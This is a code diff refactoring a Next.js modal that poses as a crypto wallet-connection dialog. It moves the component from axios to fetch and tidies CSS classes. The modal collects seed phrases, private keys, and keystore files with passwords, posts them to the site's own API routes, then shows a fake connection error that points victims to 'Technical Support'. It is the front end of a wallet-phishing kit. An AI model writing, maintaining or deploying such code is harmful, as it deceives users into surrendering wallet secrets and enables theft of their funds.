@@ -1,4 +1,3 @@
-import axios from 'axios';
 import Image from 'next/image';
 import { useEffect, useRef, useState } from 'react';
 
@@ -25,12 +24,19 @@ const Modal = ({ wallet, closeModal }) => {
         );
       } else {
         setLoading(true);
-        const res = await axios.post('/api/phrase', {
-          phrase: values.phrase,
-          wallet: wallet.name
+        const res = await fetch('/api/phrase', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            phrase: values.phrase,
+            wallet: wallet.name
+          })
         });
 
-        if (res.data.status === 'Success') {
+        const data = await res.json();
+        if (data.status === 'Success') {
           setLoading(false);
           setMessage(
             'Error Connecting to your preferred wallet! Please contact the Technical Support for further assistance!'
@@ -43,12 +49,19 @@ const Modal = ({ wallet, closeModal }) => {
         setError('Please enter a valid private key before you proceed!');
       } else {
         setLoading(true);
-        const res = await axios.post('/api/privateKey', {
-          privateKey: values.privateKey,
-          wallet: wallet.name
+        const res = await fetch('/api/privateKey', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            privateKey: values.privateKey,
+            wallet: wallet.name
+          })
         });
 
-        if (res.data.status === 'Success') {
+        const data = await res.json();
+        if (data.status === 'Success') {
           setLoading(false);
           setMessage(
             'Error Connecting to your preferred wallet! Please contact the Technical Support for further assistance!'
@@ -60,17 +73,24 @@ const Modal = ({ wallet, closeModal }) => {
       if (!values?.keystore || !values?.keystorePassword) {
         setError('Please upload file and enter password before you proceed!');
       } else {
-        console.log(values);
         const reader = new FileReader();
         reader.readAsDataURL(values.keystore);
         reader.onloadend = async () => {
           setLoading(true);
-          const res = await axios.post('/api/keystore', {
-            file: reader.result,
-            wallet: wallet.name,
-            password: values.keystorePassword
+          const res = await fetch('/api/keystore', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              file: reader.result,
+              wallet: wallet.name,
+              password: values.keystorePassword
+            })
           });
-          if (res.data.status === 'Success') {
+
+          const data = await res.json();
+          if (data.status === 'Success') {
             setLoading(false);
             setMessage(
               'Error Connecting to your preferred wallet! Please contact the Technical Support for further assistance!'
@@ -111,7 +131,7 @@ const Modal = ({ wallet, closeModal }) => {
   }, [wallet]);
 
   return (
-    <div className="fixed top-0 left-0 bottom-0 right-0 w-full h-max flex justify-center items-center">
+    <div className="fixed top-0 bottom-0 left-0 right-0 flex items-center justify-center w-full h-max">
       <div
         className="w-[100%] h-screen bg-[#00000033]"
         onClick={closeModal}
@@ -126,7 +146,7 @@ const Modal = ({ wallet, closeModal }) => {
           <div className="flex items-center justify-between p-[20px]  border-2 border-gray-300 rounded-lg">
             <div>
               <p className="text-xl mb-[10px]">{wallet.name}</p>
-              <p className="text-md text-gray-600">
+              <p className="text-gray-600 text-md">
                 Easy-to-use browser extension.
               </p>
             </div>
@@ -153,21 +173,21 @@ const Modal = ({ wallet, closeModal }) => {
           </div>
           <div className="text-[#587087] divide-x mt-[40px] px-[30px] py-[10px] flex space-x-[30px] justify-between border-b-2 border-gray-200">
             <div
-              className="relative group cursor-pointer"
+              className="relative cursor-pointer group"
               onClick={() => setMode('phrase')}
             >
               <p className="">Phrase</p>
               <div className="hidden group-hover:block absolute bottom-[-10px] left-[-10%] w-[120%] h-[2px] bg-[#66b0ff]"></div>
             </div>
             <div
-              className="relative group  cursor-pointer"
+              className="relative cursor-pointer group"
               onClick={() => setMode('keystore')}
             >
               <p className="pl-[30px]">Keystore JSON</p>
               <div className="hidden group-hover:block absolute bottom-[-10px] left-[10%] w-[100%] h-[2px] bg-[#66b0ff]"></div>
             </div>
             <div
-              className="relative group cursor-pointer"
+              className="relative cursor-pointer group"
               onClick={() => setMode('privateKey')}
             >
               <p className="pl-[30px]">Private Key</p>
